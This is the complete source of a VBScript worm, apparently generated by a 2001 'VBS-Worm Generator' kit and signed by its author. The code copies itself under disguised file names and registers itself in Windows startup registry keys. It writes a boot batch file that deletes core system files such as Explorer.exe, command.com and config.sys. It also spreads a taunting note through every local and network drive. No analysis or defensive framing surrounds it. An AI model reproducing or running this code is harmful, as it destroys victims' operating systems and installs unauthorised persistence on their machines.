   on error resume next
   dim Fso
   dim regi
   Set fso = CreateObject( "Scripting.FileSystemObject" )
   Set regi = CreateObject( "WScript.Shell" )
   fso.copyfile wscript.scriptfullname, (fso.GetSpecialFolder(1)& "\Kernel32.dll.vbs"), True
   fso.copyfile wscript.scriptfullname, (fso.GetSpecialFolder(0) & "\PicView.exe.vbs"), True
   fso.copyfile wscript.scriptfullname, ("C:\ReadMe.txt.vbs"), True
   regi.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "PicView", (fso.GetSpecialFolder(0) & "\PicView.exe.vbs")
   regi.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & "Kernel32", (fso.GetSpecialFolder(1)& "\Kernel32.dll.vbs")
   regi.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce\" & "ReadMe", ("C:\ReadMe.txt.vbs")
   Set Script = Fso.CreateTextFile ("C:\autoexec.bat",true)
   Script.Writeline "@echo off"
   Script.Writeline "del " & fso.GetSpecialFolder(0) & "\Explorer.exe" & " >nul"
   Script.Writeline "del " & fso.GetSpecialFolder(0) & "\win.ini" & " >nul"
   Script.Writeline "del " & fso.GetSpecialFolder(0) & "\Himem.sys" & " >nul"
   Script.Writeline "del " & fso.GetSpecialFolder(1) & "\User.exe" & " >nul"
   Script.Writeline "del config.sys >nul"
   Script.Writeline "del command.com >nul"
   Script.Writeline "echo ----------------"
   Script.Writeline "echo Author: PetiK"
   Script.Writeline "echo Little Boy VBS-Worm Generator/2001/ Acidcookie / www.vxbiolabs.cjb.net"
   Script.Writeline "echo ----------------"
   Script.Close
   Set Script1 = Fso.CreateTextFile (fso.GetSpecialFolder(0) & "\desktop\HEY LUSER READ THIS - NOW.txt",true)
   Script1.Writeline "You are infect by: PetiK"
   Script1.Writeline "This is VBS Virii created by VBS-Worm Generator/2001/"
   Script1.Writeline "Acidcookie / www.vxbiolabs.cjb.net"
   Script1.Close
   dodrives
   Function Dodrives()
   Set Drives = fso.Drives
   For Each Drive In Drives
   If Drive.Drivetype = Remote Then
   Drivefull = Drive & "\"
   Call Subfolders(Drivefull)
   ElseIf Drive.IsReady Then
   Drivefull = Drive & "\"
   Call Subfolders(Drivefull)
   End If
   Next
   End Function
   Function Subfolders(path)
   newpath=path
   Set Fold = fso.GetFolder(newpath)
   Set Files = Fold.Files
   For Each file In Files
   If fso.GetExtensionName(file.path) = "txt" Then
   Set kopi = fso.GetFile(fso.GetSpecialFolder(0) & "\desktop\HEY LUSER READ THIS - NOW.txt")
   kopi.copy (fold.path & "\HEY LUSER READ THIS - NOW.txt")
   End If
   Next
   Set file = Fold.Subfolders
   For Each Subfol In file
   Call Subfolders(Subfol.path)
   Next
   End Function
   'Name of virii is: EMM
   'This virii is created by Little Boy VBS-Worm Generator/2001/ Acidcookie  / www.vxbiolabs.cjb.net
